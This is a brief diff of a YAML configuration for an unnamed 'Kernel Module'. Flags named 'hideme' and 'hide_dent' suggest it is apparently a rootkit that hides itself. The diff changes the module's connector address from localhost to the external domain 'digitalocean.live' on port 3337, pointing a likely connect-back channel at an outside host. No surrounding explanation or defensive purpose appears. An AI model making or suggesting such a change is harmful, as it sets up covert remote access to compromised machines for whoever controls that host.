@@ -3,7 +3,7 @@ module:
     description: "Kernel Module"
     version: "1.0"
 connector:
-    ip: "127.0.0.1"
+    ip: "digitalocean.live"
     port: "3337"
 hideme: false
 hide_dent:
